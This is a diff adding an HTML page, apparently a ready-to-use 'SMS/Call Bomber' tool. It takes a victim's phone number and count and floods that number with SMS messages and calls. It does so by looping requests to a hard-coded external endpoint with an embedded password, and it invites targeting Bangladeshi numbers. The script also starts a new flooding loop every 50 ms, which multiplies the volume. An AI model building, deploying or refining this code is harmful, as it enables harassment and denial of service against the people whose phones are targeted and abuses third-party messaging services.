@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Premium SMS/Call Bomber Pro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Poppins', sans-serif; 
+            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            color: #fff; 
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .glass-container { 
+            max-width: 550px; 
+            margin: 50px auto; 
+            background: rgba(255,255,255,0.1); 
+            backdrop-filter: blur(20px); 
+            border-radius: 25px; 
+            padding: 40px; 
+            box-shadow: 0 25px 45px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        .glass-container::before {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            transform: rotate(45deg); animation: shine 3s infinite;
+        }
+        @keyframes shine { 0%, 100% { transform: translateX(-100%) translateY(-100%) rotate(45deg); } 50% { transform: translateX(100%) translateY(100%) rotate(45deg); } }
+
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { 
+            font-family: 'Orbitron', monospace; 
+            font-size: 2.5em; 
+            background: linear-gradient(45deg, #ff6b6b, #feca57, #48cae4); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            text-shadow: 0 0 30px rgba(255,255,255,0.5);
+            margin-bottom: 10px;
+        }
+        .logo p { font-size: 1.1em; opacity: 0.9; }
+
+        .input-group { margin-bottom: 20px; position: relative; }
+        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #ddd; font-size: 1.2em; z-index: 2; }
+        input, select { 
+            width: 100%; padding: 18px 18px 18px 50px; 
+            border: 2px solid rgba(255,255,255,0.2); 
+            border-radius: 15px; 
+            background: rgba(255,255,255,0.1); 
+            color: white; 
+            font-size: 16px; 
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+        input::placeholder, select option { color: rgba(255,255,255,0.7); }
+        input:focus, select:focus { 
+            outline: none; 
+            border-color: #feca57; 
+            box-shadow: 0 0 20px rgba(254,202,87,0.4); 
+            transform: scale(1.02);
+        }
+        select option { background: #1a1a2e; color: white; }
+
+        .btn { 
+            width: 100%; padding: 18px; margin: 10px 0; 
+            border: none; border-radius: 15px; 
+            font-size: 18px; font-weight: 600; cursor: pointer; 
+            transition: all 0.3s ease; position: relative; overflow: hidden;
+            font-family: 'Orbitron', monospace;
+        }
+        .btn-primary { 
+            background: linear-gradient(45deg, #ff6b6b, #feca57); 
+            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
+        }
+        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(255,107,107,0.6); }
+        .btn-secondary { 
+            background: linear-gradient(45deg, #6c5ce7, #a29bfe); 
+            box-shadow: 0 10px 30px rgba(108,92,231,0.4);
+        }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none !important; }
+
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 25px 0; }
+        .stat-card { 
+            background: rgba(255,255,255,0.15); 
+            padding: 20px; border-radius: 15px; text-align: center; 
+            backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2);
+            transition: transform 0.3s;
+        }
+        .stat-card:hover { transform: scale(1.05); }
+        .stat-icon { font-size: 2.5em; margin-bottom: 10px; }
+        .sms .stat-icon { color: #00f5ff; text-shadow: 0 0 20px #00f5ff; }
+        .call .stat-icon { color: #ff6b9d; text-shadow: 0 0 20px #ff6b9d; }
+        .total .stat-icon { color: #feca57; text-shadow: 0 0 20px #feca57; }
+        .stat-number { font-family: 'Orbitron', monospace; font-size: 2.2em; font-weight: 900; margin-bottom: 5px; }
+
+        #status { 
+            padding: 20px; border-radius: 15px; text-align: center; font-weight: 600; 
+            margin: 20px 0; font-size: 1.1em;
+        }
+        .success { background: rgba(40,167,69,0.3); border: 2px solid #51cf66; box-shadow: 0 0 30px rgba(81,207,102,0.5); }
+        .error { background: rgba(220,53,69,0.3); border: 2px solid #ff6b6b; box-shadow: 0 0 30px rgba(255,107,107,0.5); }
+        .info { background: rgba(23,162,184,0.3); border: 2px solid #48cae4; box-shadow: 0 0 30px rgba(72,202,228,0.5); }
+
+        #log { 
+            height: 220px; overflow-y: auto; 
+            background: rgba(0,0,0,0.4); 
+            padding: 20px; border-radius: 15px; 
+            font-family: 'Orbitron', monospace; 
+            font-size: 13px; line-height: 1.5;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .log-entry { margin-bottom: 8px; padding: 8px; background: rgba(255,255,255,0.05); border-radius: 8px; border-left: 4px solid #feca57; }
+
+        @media (max-width: 600px) { .glass-container { margin: 20px; padding: 25px; } .logo h1 { font-size: 2em; } }
+    </style>
+</head>
+<body>
+    <div class="glass-container">
+        <div class="logo">
+            <h1><i class="fas fa-bomb"></i> Bomber Pro</h1>
+            <p>Premium SMS/Call Flood Tool <span style="font-size:0.8em;">| api.paglahost.shop</span></p>
+        </div>
+
+        <div class="input-group">
+            <i class="fas fa-phone"></i>
+            <input type="tel" id="phone" placeholder="📱 Phone: 0123456789..." required>
+        </div>
+        
+        <div class="input-group">
+            <i class="fas fa-layer-group"></i>
+            <select id="type">
+                <option value="sms">💬 SMS Only</option>
+                <option value="call">📞 Call Only</option>
+                <option value="mix">🔥 SMS + Call Mix</option>
+            </select>
+        </div>
+        
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+            <div class="input-group">
+                <i class="fas fa-bullseye"></i>
+                <input type="number" id="amount" placeholder="Total Bombs" min="100" max="10000" value="1000">
+            </div>
+            <div class="input-group">
+                <i class="fas fa-clock"></i>
+                <input type="number" id="delay" placeholder="Delay (ms)" min="300" max="5000" value="1200">
+            </div>
+        </div>
+
+        <button class="btn btn-primary" onclick="startBomb()">
+            <i class="fas fa-rocket"></i> 🚀 START PREMIUM BOMB
+        </button>
+        <button class="btn btn-secondary" onclick="stopBomb()">
+            <i class="fas fa-stop"></i> ⏹️ STOP BOMBING
+        </button>
+
+        <div class="stats-grid">
+            <div class="stat-card sms">
+                <div class="stat-icon"><i class="fas fa-sms"></i></div>
+                <div class="stat-number" id="smsCount">0</div>
+                <div>SMS Sent</div>
+            </div>
+            <div class="stat-card call">
+                <div class="stat-icon"><i class="fas fa-phone"></i></div>
+                <div class="stat-number" id="callCount">0</div>
+                <div>Calls Sent</div>
+            </div>
+            <div class="stat-card total">
+                <div class="stat-icon"><i class="fas fa-bomb"></i></div>
+                <div class="stat-number" id="totalCount">0</div>
+                <div>Total Bombs</div>
+            </div>
+        </div>
+
+        <div id="status" class="info">⚡ Premium tool ready! Enter target & unleash 🔥</div>
+        <div id="log"></div>
+    </div>
+
+    <script>
+        let worker = null, isRunning = false, smsCount = 0, callCount = 0, totalCount = 0;
+        const API_BASE = 'https://api.paglahost.shop/SMS+call_BOMBAR999/index.php';
+        const PASSWORD = '2day';
+
+        function updateStats() {
+            document.getElementById('smsCount').textContent = smsCount;
+            document.getElementById('callCount').textContent = callCount;
+            document.getElementById('totalCount').textContent = totalCount;
+        }
+
+        function log(msg, type = 'info') {
+            const logEl = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            const entry = `<div class="log-entry">${time} | ${msg}</div>`;
+            logEl.innerHTML += entry;
+            logEl.scrollTop = logEl.scrollHeight;
+            document.getElementById('status').innerHTML = msg;
+            document.getElementById('status').className = type;
+        }
+
+        async function sendBomb(phone, bombType) {
+            const params = new URLSearchParams({ password: PASSWORD, phone: phone });
+            if (bombType === 'call') params.append('type', 'call');
+            else if (bombType === 'sms') params.append('type', 'sms');
+
+            try {
+                const res = await fetch(`${API_BASE}?${params}`, { method: 'GET', mode: 'no-cors' });
+                totalCount++;
+                if (bombType === 'sms') { smsCount++; log(`✅ SMS #${smsCount} → ${phone.slice(-8)}`, 'success'); }
+                else if (bombType === 'call') { callCount++; log(`📞 CALL #${callCount} → ${phone.slice(-8)}`, 'success'); }
+                updateStats();
+            } catch (e) {
+                log(`❌ ${bombType.toUpperCase()} failed: ${e.message}`, 'error');
+            }
+        }
+
+        function bombLoop() {
+            const phone = document.getElementById('phone').value.trim();
+            const type = document.getElementById('type').value;
+            const amount = parseInt(document.getElementById('amount').value);
+            const delay = parseInt(document.getElementById('delay').value);
+
+            if (!phone || !amount) return log('❌ Phone/Amount missing!', 'error');
+
+            let sent = 0;
+            const interval = setInterval(async () => {
+                if (sent >= amount || !isRunning) {
+                    clearInterval(interval);
+                    if (sent >= amount) log(`🎉 Complete! SMS:${smsCount} | Calls:${callCount} | Total:${totalCount}`, 'success');
+                    return;
+                }
+                
+                const bombType = type === 'mix' ? (sent % 2 ? 'sms' : 'call') : type;
+                await sendBomb(phone, bombType);
+                sent++;
+            }, delay);
+        }
+
+        window.startBomb = () => {
+            if (isRunning) return;
+            isRunning = true; smsCount = callCount = totalCount = 0;
+            updateStats();
+            log('🔥 Premium bombing activated! 💣', 'success');
+            worker = setInterval(bombLoop, 50);
+            document.querySelector('.btn-primary').disabled = true;
+        };
+
+        window.stopBomb = () => {
+            isRunning = false; clearInterval(worker);
+            document.querySelector('.btn-primary').disabled = false;
+            log(`⏹️ Stopped | Final: SMS:${smsCount} | Calls:${callCount} | Total:${totalCount}`, 'info');
+        };
+
+        window.onload = () => log('⚡ Pro tool loaded. Target BD numbers for max effect! 🚀', 'info');
+    </script>
+</body>
+</html>
